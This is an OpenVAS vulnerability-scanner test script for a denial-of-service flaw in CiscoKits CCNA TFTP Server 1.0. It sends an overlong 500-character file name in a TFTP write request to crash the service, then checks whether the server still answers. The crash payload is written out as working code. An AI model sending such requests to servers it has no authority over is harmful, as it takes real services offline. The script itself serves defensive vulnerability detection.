###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ciscokits_tftp_server_write_dos_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# CiscoKits CCNA TFTP Server 'Write' Command Denial Of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow an attacker to cause denial of service
  condition.
  Impact Level: Application";
tag_affected = "CiscoKits CCNA TFTP Server 1.0";
tag_insight = "The flaw is due to improper validation of 'WRITE' request parameter
  containing a long file name, which allows remote attackers to crash the
  service and cause denial of service condition.";
tag_solution = "No solution or patch is available as of 8th August, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.certificationkits.com/tftpserver/tftpserver.zip";
tag_summary = "This host is running Ciscokits CCNA TFTP Server and is prone to
  denial of service vulnerability.";

if(description)
{
  script_id(802232);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-08-10 13:49:51 +0200 (Wed, 10 Aug 2011)");
  script_bugtraq_id(49045);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"risk_factor", value:"High");
  script_name("CiscoKits CCNA TFTP Server 'Write' Command Denial Of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/69042");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17618/");
  script_xref(name : "URL" , value : "http://secpod.org/SECPOD_CiscoKits_CCNA_TFTP_DoS_POC.py");
  script_xref(name : "URL" , value : "http://secpod.org/advisories/SECPOD_Ciscokits_CCNA_TFTP_DoS.txt");

  script_description(desc);
  script_summary("Determine if CiscoKits CCNA TFTP Server is prone to denial-of-service vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_require_keys("Services/udp/tftp");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


## Check for TFTP service
port = get_kb_item("Services/udp/tftp");
if(!port){
  port = 69;
}

## Open UDP Socket
soc = open_sock_udp(port);
if(!soc){
  exit(0);
}

mode = "netascii";

## Try to access invalid file to confirm TFTP is alive
req = raw_string(0x00, 0x01) +          ## Read Request
      "AAA.txt" + raw_string(0x00) +    ## Source File Name
      mode + raw_string(0x00);          ## Type (Mode)

## Send Read Request
send(socket:soc, data:req);
res = recv(socket:soc, length:100);

## Confirm TFTP is alive before sending attack request
if(isnull(res) || "Not Found in local Storage" >!< res){
  exit(0);
}

## Construct the attack request with long file name
attack = raw_string(0x00, 0x02) +                           ## Write Request
         crap(data: "A", length: 500) + raw_string(0x00) +  ## Source File Name
         mode + raw_string(0x00);                           ## Type (Mode)

## Send the attack request to Ciscokits TFTP Server
send(socket:soc, data:attack);
close(soc);

## Wait for 5 seconds..
sleep(5);

## Open UDP Socket
soc1 = open_sock_udp(port);
if(!soc1)
{
  security_hole(port);
  exit(0);
}

## Try to access invalid file
send(socket:soc1, data:req);
res = recv(socket:soc1, length:100);

## Check Ciscokits TFTP Server is alive or not
if(isnull(res) || "Not Found in local Storage" >!< res)
{
  security_hole(port);
  exit(0);
}

close(soc1);
